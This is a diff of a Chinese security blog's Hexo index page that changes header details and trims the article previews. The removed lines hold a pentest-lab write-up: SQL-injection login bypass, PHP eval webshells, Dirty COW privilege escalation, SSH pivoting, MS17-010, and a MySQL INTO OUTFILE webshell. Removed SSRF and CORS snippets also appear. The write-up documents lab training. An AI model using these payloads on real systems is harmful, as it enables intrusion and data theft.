@@ -21,7 +21,7 @@
 <meta property="og:site_name" content="HI">
 <meta property="og:description" content="人们不会总是很快理解自己当前某件事的价值，直到它变成回忆。🍂">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:author" content="UknowJJ">
+<meta property="article:author" content="人们不会总是很快明白当前所做的事，直到它变成回忆~🍂">
 <meta name="twitter:card" content="summary">
   
   
@@ -59,40 +59,26 @@
       
 
 
-<div class="overlay" style="background: #4d4d4d;"></div>
+<div class="overlay" style="background: #4d4d4d;background: url('/img/biubiubiu.gif') no-repeat ;"></div>
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
 			<img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/head.png" class="js-avatar">
 		</a>
 		<hgroup>
-			<h1 class="header-author"><a href="/">UknowJJ</a></h1>
+			<h1 class="header-author"><a href="/">人们不会总是很快明白当前所做的事，直到它变成回忆~🍂</a></h1>
 		</hgroup>
 		
 
 		<nav class="header-menu">
 			<ul>
 			
-				<li><a href="/" target="_blank">主页</a></li>
-			
-				<li><a href="/null" target="_blank">技术笔记</a></li>
-			
-				<li><a href="/tags/%E9%9A%8F%E7%AC%94/" target="_blank">随笔</a></li>
-			
 			</ul>
 		</nav>
 		<nav class="header-smart-menu">
 			
 				
-					<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
-				
-			
-				
-					<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
-				
-			
-				
-					<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
+					<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">文章目录</a>
 				
 			
 		</nav>
@@ -100,23 +86,8 @@
 			<div class="social">
 				
 					
-						<a class="github" href="#" 
-												title="GitHub" target="_blank"><i class="icon-github"></i></a>
-					
-				
-					
-						<a class="github" href="#" 
-												title="GitHub" target="_blank"><i class="icon-github"></i></a>
-					
-				
-					
-						<a class="gitee" href="#" 
-												title="码云" target="_blank"><i class="icon-gitee"></i></a>
-					
-				
-					
-						<a class="jianshu" href="#" 
-												title="简书" target="_blank"><i class="icon-jianshu"></i></a>
+						<a class="weixin" href="/wechat/U_knowJJ" 
+												title="微信" target="_blank"><i class="icon-weixin"></i></a>
 					
 				
 			</div>
@@ -127,12 +98,6 @@
 
     </div>
     <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
-      
-      
-      <a class="forkMe" style="position:absolute;z-index:999;top:0;right:0.5em;" 
-        href="https://github.com/JoeyBling/hexo-theme-yilia-plus" target="_blank">
-        <img src="/img/forkme.png"
-          class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
       
       
 <nav id="mobile-nav">
@@ -148,16 +113,10 @@
 				</a>
 			</div>
 			<hgroup>
-			  <h1 class="header-author js-header-author">UknowJJ</h1>
+			  <h1 class="header-author js-header-author">人们不会总是很快明白当前所做的事，直到它变成回忆~🍂</h1>
 			</hgroup>
 			
 			
-			
-				
-			
-				
-			
-				
 			
 			
 			
@@ -165,38 +124,17 @@
 				<div class="social">
 					
 						
-						<a class="github" target="_blank" 
-							href="#" title="GitHub"><i class="icon-github"></i></a>
-						
-					
-						
-						<a class="github" target="_blank" 
-							href="#" title="GitHub"><i class="icon-github"></i></a>
-						
-					
-						
-						<a class="gitee" target="_blank" 
-							href="#" title="码云"><i class="icon-gitee"></i></a>
-						
-					
-						
-						<a class="jianshu" target="_blank" 
-							href="#" title="简书"><i class="icon-jianshu"></i></a>
+						<a class="weixin" target="_blank" 
+							href="/wechat/U_knowJJ" title="微信"><i class="icon-weixin"></i></a>
 						
 					
 				</div>
 			</nav>
 
 			<nav class="header-menu js-header-menu">
-				<ul style="width: 70%">
+				<ul style="width: 50%">
 				
 				
-					<li style="width: 33.333333333333336%"><a href="/">主页</a></li>
-		        
-					<li style="width: 33.333333333333336%"><a href="/null">技术笔记</a></li>
-		        
-					<li style="width: 33.333333333333336%"><a href="/tags/%E9%9A%8F%E7%AC%94/">随笔</a></li>
-		        
 				</ul>
 			</nav>
 		</header>				
@@ -244,155 +182,11 @@
   <div class="article-entry" itemprop="articleBody">
     
     <p>记一次从web到内网靶场渗透的过程，靶场还是比较简单，配置流量转发的时候遇到了一点坑多花了点时间</p>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>全程均为内网靶场环境</p>
-<h4 id="攻击方"><a href="#攻击方" class="headerlink" title="攻击方"></a>攻击方</h4><p>kali（虚拟机），windows10</p>
-<h4 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h4><h6 id="外网IP"><a href="#外网IP" class="headerlink" title="外网IP"></a>外网IP</h6><p>web：10.100.1.107</p>
-<h6 id="内网IP"><a href="#内网IP" class="headerlink" title="内网IP"></a>内网IP</h6><p>OA系统：192.168.223.1</p>
-<p>windows_server:192.168.223.2</p>
-<p>DB:192.168.223.3</p>
 <h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为我们不能直接访问靶机的内网，所以需要拿下web服务器，利用web服务器做跳板，访问内网的IP</p>
-<h1 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h1><h4 id="进入管理页面"><a href="#进入管理页面" class="headerlink" title="进入管理页面"></a>进入管理页面</h4><p>首先访问web</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220620194550927.png" alt="image-20220620194550927"></p>
-<p>点击登录，前端检测必须用户名为XXX@XXX，所以我们随便填一个，burpsuite抓包试试</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220620194851355.png" alt="image-20220620194851355"></p>
-<p>我们尝试一下万能密码，<code>&#39; or 1=1#</code></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220620195008487.png" alt="image-20220620195008487"></p>
-<p>放行流量后直接进入管理后台</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220620195224326.png" alt="image-20220620195224326"></p>
-<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>可以尝试找找有没有文件上传这些漏洞，显然它检测文件需要为png，可以看看有没有办法绕过</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220620195211162.png" alt="image-20220620195211162"></p>
-<p>我们直接上传一个冰蝎马试试</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220620195454378.png" alt="image-20220620195454378"></p>
-<p>我们修改content-type里面的参数为image&#x2F;png</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220620195600666.png" alt="image-20220620195600666"></p>
-<p>发现上传成功！<img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220620195618366.png" alt="image-20220620195618366"></p>
-<p>我们去到头像的目录下，发现生成，admin.php文件，尝试连接上线</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220620195729273.png" alt="image-20220620195729273"></p>
-<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>成功连接，用<code>uname -a</code>看看版本，此linux版本可以利用脏牛漏洞提权（可以百度搜搜脏牛漏洞，很多脚本与教程，我这里就跳过）</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220620195859304.png" alt="image-20220620195859304"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220620195951366.png" alt="image-20220620195951366"></p>
-<p>上传dirty.c（脏牛漏洞脚本）并使用此代码编译一下<code>gcc -pthread dirty.c -o dirty -lcrypt</code></p>
-<p>获得一个新的dirty文件并<code>./dirty</code>执行</p>
-<p>（注：如果报错<code>/tmp/passwd.bak already exists</code>,直接删除再执行一次）</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621093935144.png" alt="image-20220621093935144"></p>
-<p>切换新的root用户后，记得<code>mv /tmp/passwd.bak /etc/passwd</code></p>
-<h4 id="上传msf马准备后渗透"><a href="#上传msf马准备后渗透" class="headerlink" title="上传msf马准备后渗透"></a>上传msf马准备后渗透</h4><p>先制作一个，用冰蝎上传，并监听</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621094408842.png" alt="image-20220621094408842"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621094822187.png" alt="image-20220621094822187"></p>
-<p>去到冰蝎下面执行木马，成功反弹</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621094841778.png" alt="image-20220621094841778"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621095714582.png" alt="image-20220621095714582"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621095755981.png" alt="image-20220621095755981"></p>
-<h4 id="查看日志，发现内网主机"><a href="#查看日志，发现内网主机" class="headerlink" title="查看日志，发现内网主机"></a>查看日志，发现内网主机</h4><p>网段：192.168.223.0&#x2F;24</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621095920247.png" alt="image-20220621095920247"></p>
-<h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><p><strong>咱们不可以直接访问内网，先配置一个端口转发</strong></p>
-<p><em>方法（可以使用ew等代理工具，或者msf里面的route）</em></p>
-<p><em>我们就直接用ssh转发流量，挺稳定的</em></p>
-<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>因为我们kali无法ping通内网机器，而web服务器可以，所以需要做一个反向代理</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621100113894.png" alt="image-20220621100113894"></p>
-<p>用msf把web靶机的22端口转发到本地的<code>3344</code>端口</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621095008802.png" alt="image-20220621095008802"></p>
-<p>使用提权后的root账户（firefart）连接kali本地的<code>3344</code>端口，连接成功。说明端口可以成功访问</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621095131863.png" alt="image-20220621095131863"></p>
-<p>接下来，我们用<code>ssh -f -N -D 0.0.0.0:1314  firefart@127.0.0.1 -p 3344</code>把流量转到本机<code>1314</code>端口。（不能配置127.0.0.1：1314，否则不能把虚拟机kali的流量转出到windows使用，会很麻烦）</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621101314988.png" alt="image-20220621101314988"></p>
-<p>并将端口配置于<code>/etc/proxychains4.conf</code>，待会会用到proxychains 工具</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621101437508.png" alt="image-20220621101437508"></p>
-<p>使用proxychains 扫描一下192.168.223.2的端口，发现可以成功扫描，说明我们配置成功，进入内网</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621100548243.png" alt="image-20220621100548243"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621100539429.png" alt="image-20220621100539429"></p>
-<h4 id="寻找内网主机"><a href="#寻找内网主机" class="headerlink" title="寻找内网主机"></a>寻找内网主机</h4><p><code>proxychains nmap -sP 192.168.223.0/24</code></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621100746711.png" alt="image-20220621100746711"></p>
-<p>发现存在<code>192.168.223.1、192.168.223.2、192.168.223.3</code></p>
-<p>大致看了下端口，</p>
-<p><code>192.168.223.1</code>(先去看看80端口的服务)</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621100947964.png" alt="image-20220621100947964"></p>
-<p><code>192.168.223.2</code>（445端口可以测试一下ms17_010）</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621100907621.png" alt="image-20220621100907621"></p>
-<p><code>192.168.223.3</code></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621101210510.png" alt="image-20220621101210510"></p>
-<h3 id="第一台"><a href="#第一台" class="headerlink" title="第一台"></a>第一台</h3><p>先从192.168.223.1开始吧，我们把kali里面的流量转到windows上来，不然不方便。</p>
-<p>直接给浏览器配置代理即可</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621101710210.png" alt="image-20220621101710210"></p>
-<p>成功访问OA系统，发现随便输入了几个密码，进不去，但是没有错误次数限制，并且给出密码是五位数字，那就简单了，直接爆破。</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621101843800.png" alt="image-20220621101843800"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621101954212.png" alt="image-20220621101954212"></p>
-<h5 id="配置burp跳板机代理"><a href="#配置burp跳板机代理" class="headerlink" title="配置burp跳板机代理"></a>配置burp跳板机代理</h5><p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621102354269.png" alt="image-20220621102354269"></p>
-<h5 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h5><p>00000-99999</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621102537808.png" alt="image-20220621102537808"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621102521371.png" alt="image-20220621102521371"></p>
-<p>开始爆破</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621102558384.png" alt="image-20220621102558384"></p>
-<p>爆出密码后进入系统，发现修改page&#x3D;后参数，可以跳转网页</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621102709673.png" alt="image-20220621102709673"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621102731656.png" alt="image-20220621102731656"></p>
-<h5 id="文件包含-文件上传"><a href="#文件包含-文件上传" class="headerlink" title="文件包含+文件上传"></a>文件包含+文件上传</h5><p>测试一下<code>../../../etc/passwd</code>,存在文件包含漏洞</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621102823529.png" alt="image-20220621102823529"></p>
-<p>测试一下头像上传点</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621103034267.png" alt="image-20220621103034267"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621102938085.png" alt="image-20220621102938085"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621102945099.png" alt="image-20220621102945099"></p>
-<p>我们将后缀直接修改为.png，直接上传成功，我们去检查一下，直接访问头像地址，发现不能被解析</p>
-<p>复制头像路径，放在page后面</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621103239496.png" alt="image-20220621103239496"></p>
-<p>利用成功~ 我们再上传一句话木马测试一波</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621103302102.png" alt="image-20220621103302102"></p>
-<p>上传新的图片马，<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code>写入<code>88.php</code>,改名为<code>88.png</code></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621103500831.png" alt="image-20220621103500831"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621103355498.png" alt="image-20220621103355498"></p>
-<p>上传成功，但是蚁剑，菜刀，说什么都连不上，但是可以利用post data执行命令。<img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621103644969.png" alt="image-20220621103644969"></p>
-<p>尝试重新写个木马进去，先测试是否可以写入php文件,在双引号里面输入<code>echo 111 &gt; 1.php</code>，再查看</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621103740485.png" alt="image-20220621103740485"></p>
-<p>我们写入一句话木马看看，发现写入不成功，估计是有限制</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621104102733.png" alt="image-20220621104102733"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621104205982.png" alt="image-20220621104205982"></p>
-<p>经过几番测试，是对$符号有限制，我们直接把一句话木马，用base64加密，再解密试试</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621105343469.png" alt="image-20220621105343469"></p>
-<p>发现写入成功</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621105422632.png" alt="image-20220621105422632"></p>
-<p>用蚁剑测试连接，记得先配置代理</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621105612240.png" alt="image-20220621105612240"></p>
-<p>成功连接！<img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621105641193.png" alt="image-20220621105641193"></p>
-<h5 id="上传msf马"><a href="#上传msf马" class="headerlink" title="上传msf马"></a>上传msf马</h5><p>准备上传msf马，启动时记得带上proxychains</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621105850618.png" alt="image-20220621105850618"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621110104159.png" alt="image-20220621110104159"></p>
-<p>上传后执行，反弹</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621110305351.png" alt="image-20220621110305351"></p>
-<h3 id="第二台"><a href="#第二台" class="headerlink" title="第二台"></a>第二台</h3><p>192.168.223.2</p>
-<p>开放的445端口，我们先测试一下，把之前监听的192.168.223.1至于后台</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621110427022.png" alt="image-20220621110427022"></p>
-<h5 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17_010"></a>ms17_010</h5><p>先用scanner扫描一下吧，直接<code>use 4</code>，然后配置options</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621110447052.png" alt="image-20220621110447052"></p>
-<p>说明的确存在，我们再use 0，使用第一个打进去</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621110620868.png" alt="image-20220621110620868"></p>
-<p>先修改payload</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621110740821.png" alt="image-20220621110740821"></p>
-<p>OK，直接打进去了，可以开启3398端口，方便咱们连接使用<img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621110828269.png" alt="image-20220621110828269"></p>
-<p>现在拿下两台内网机器</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621113411872.png" alt="image-20220621113411872"></p>
-<h3 id="第三台"><a href="#第三台" class="headerlink" title="第三台"></a>第三台</h3><p>192.168.223.3</p>
-<p>先访问一下</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621111322306.png" alt="image-20220621111322306"></p>
-<p>发现是phpmyadmin，肯定连接了数据库。随后我在192.168.223.1的OA系统上找到了数据库的配置文件。里面有用户名和密码，但是此网页登陆不进去，就直接尝试mysql链接吧。</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621113528042.png" alt="image-20220621113528042"></p>
-<h5 id="mysql连接成功"><a href="#mysql连接成功" class="headerlink" title="mysql连接成功"></a>mysql连接成功</h5><p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621113600678.png" alt="image-20220621113600678"></p>
-<h5 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h5><p>查看mysql的版本</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621113804475.png" alt="image-20220621113804475"></p>
-<p>首先基础语法查询是否 secure_file_priv 没有限制</p>
-<p>输入<code>show global variables like &#39;%secure_file_priv%&#39;;</code></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621113856924.png" alt="image-20220621113856924"></p>
-<p><code>NULL    不允许导入或导出</code><br><code>/var    只允许在/var目录导入导出</code><br><code>空    不限制目录</code></p>
-<p><code>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</code></p>
-<p><code>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</code></p>
-<h6 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h6><p>输入<code>select &#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; into outfile &#39;/var/www/html/123456.php&#39;;</code>，目录是我自己构造的</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621114154725.png" alt="image-20220621114154725"></p>
-<h6 id="连接成功"><a href="#连接成功" class="headerlink" title="连接成功"></a>连接成功</h6><p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621114252722.png" alt="image-20220621114252722"></p>
-<h5 id="上传msf马-1"><a href="#上传msf马-1" class="headerlink" title="上传msf马"></a>上传msf马</h5><p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621114458930.png" alt="image-20220621114458930"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621114512783.png" alt="image-20220621114512783"></p>
-<h6 id="反弹成功"><a href="#反弹成功" class="headerlink" title="反弹成功"></a>反弹成功</h6><p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621114622265.png" alt="image-20220621114622265"></p>
-<h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><h4 id="web服务器-3台内网机器"><a href="#web服务器-3台内网机器" class="headerlink" title="web服务器+3台内网机器"></a>web服务器+3台内网机器</h4><p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621114715893.png" alt="image-20220621114715893"></p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220621114733436.png" alt="image-20220621114733436"></p>
-
+<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220627213955230.png" alt="image-20220627213955230"></p>
+    
+    <a class="article-more-a" href="/2022/06/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8Eweb%E5%88%B0%E5%86%85%E7%BD%91%E7%9A%84%E6%B8%97%E9%80%8F/#more">more >></a>
+    
     
 
     
@@ -472,13 +266,9 @@
 <p>fsockopen():打开一个网络连接或者一个Unix套接字连接</p>
 <p>curl_exec():初始化一个新的会话</p>
 <p>fopen():打开一个文件或者URL</p>
-<h3 id="3-攻击中涉及的协议"><a href="#3-攻击中涉及的协议" class="headerlink" title="3.攻击中涉及的协议"></a>3.攻击中涉及的协议</h3><p>（1）http:<code>?url=http://127.0.0.1/flag.php</code>过滤不严谨，访问内网</p>
-<p>（2）dcit：<code>?url=dict://127.0.0.1:$8080$</code>爆破$$里的端口，然后直接访问</p>
-<p>（3）file：<code>?url=file:/var/www/html/flag.php</code>需要知道文件的具体目录</p>
-<p>（4）Gopher:<code>构造GET/POST包攻击应用</code></p>
-<p>（5）FastCGI:利用Gopherus</p>
-<p>（6）Redis：<code>?url=redis://127.0.0.1:6379</code></p>
-
+    
+    <a class="article-more-a" href="/2022/04/14/SSRF%E5%88%A9%E7%94%A8%E5%B0%8F%E8%AE%A1/#more">more >></a>
+    
     
 
     
@@ -557,23 +347,9 @@
 <p><em>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。通过该标准，可以允许浏览器向跨源服务器发出 XMLHttpRequest 请求，从而克服了AJAX只能同源使用的限制，进而读取跨域的资源。CORS允许Web服务器通知Web浏览器应该允许哪些其他来源从该Web服务器的回复中访问内容</em></p>
 <p><em>漏洞产生原因：在Access-Control-Allow-Origin中反射请求的Origin值。该配置可导致任意攻击者网站可以直接跨域读取其资源内容。</em></p>
 <h2 id="漏洞检测："><a href="#漏洞检测：" class="headerlink" title="漏洞检测："></a>漏洞检测：</h2><h3 id="1-POC："><a href="#1-POC：" class="headerlink" title="1.POC："></a>1.POC：</h3><p>curl <a target="_blank" rel="noopener" href="https://target.com/bee/collect">https://target.com/bee/collect</a> -H “Origin: <a target="_blank" rel="noopener" href="https://xxx.com&quot;/">https://XXX.com&quot;</a> -I</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220414093648697.png" alt="image-20220414093648697"></p>
-<p>出现以下信息即有漏洞存在</p>
-<pre><code>Access-Control-Allow-Origin: xxxxx.com
-Access-Control-Allow-Credentials: true
-</code></pre>
-<h3 id="2-burp发包"><a href="#2-burp发包" class="headerlink" title="2.burp发包"></a>2.burp发包</h3><p>添加</p>
-<p><code>Origin: https://XXX.com</code>参数</p>
-<p>若返回以下，则存在</p>
-<p>Access-Control-Allow-Origin: xxxxx.com<br>Access-Control-Allow-Credentials: true</p>
-<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>1.构造钓鱼html，在箭头位置输入目标url</p>
-<p>同于csrf跨站请求伪造，发送钓鱼链接，读取用户敏感数据。</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220414093056652.png" alt="image-20220414093056652"></p>
-<p>2.使用phpstudy打开网页</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220413130643907.png" alt="image-20220413130643907"></p>
-<p>对比目标网页下的信息</p>
-<p><img src="https://jjhome-1301842952.cos.ap-chongqing.myqcloud.com/markdown/image-20220414093248346.png" alt="image-20220414093248346"></p>
-
+    
+    <a class="article-more-a" href="/2022/04/14/CORS%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/#more">more >></a>
+    
     
 
     
@@ -647,159 +423,10 @@ Access-Control-Allow-Credentials: true
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h3 id="先上题目源码"><a href="#先上题目源码" class="headerlink" title="先上题目源码"></a>先上题目源码</h3><pre><code class="php+HTML">&lt;?php
-header(&quot;Content-Type:text/html; charset=utf-8&quot;);
-// 每5分钟会清除一次目录下上传的文件
-require_once(&#39;pclzip.lib.php&#39;);
-
-if(!$_FILES)&#123;
-
-        echo &#39;
-
-&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;zh&quot;&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot; /&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
-    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot; /&gt;
-    &lt;title&gt;文件上传章节练习题&lt;/title&gt;
-    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u&quot; crossorigin=&quot;anonymous&quot;&gt;
-    &lt;style type=&quot;text/css&quot;&gt;
-        .login-box&#123;
-            margin-top: 100px;
-            height: 500px;
-            border: 1px solid #000;
-        &#125;
-        body&#123;
-            background: white;
-        &#125;
-        .btn1&#123;
-            width: 200px;
-        &#125;
-        .d1&#123;
-            display: block;
-            height: 400px;
-        &#125;
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;div class=&quot;container&quot;&gt;
-        &lt;div class=&quot;login-box col-md-12&quot;&gt;
-        &lt;form class=&quot;form-horizontal&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;
-            &lt;h1&gt;文件上传章节练习题&lt;/h1&gt;
-            &lt;hr /&gt;
-            &lt;div class=&quot;form-group&quot;&gt;
-                &lt;label class=&quot;col-sm-2 control-label&quot;&gt;选择文件：&lt;/label&gt;
-                &lt;div class=&quot;input-group col-sm-10&quot;&gt;
-                    &lt;div &gt;
-                    &lt;label for=&quot;&quot;&gt;
-                        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
-                    &lt;/label&gt;
-                    &lt;/div&gt;
-                &lt;/div&gt;
-            &lt;/div&gt;
-                
-        &lt;div class=&quot;col-sm-8  text-right&quot;&gt;
-            &lt;input type=&quot;submit&quot; class=&quot;btn btn-success text-right btn1&quot; /&gt;
-        &lt;/div&gt;
-        &lt;/form&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;
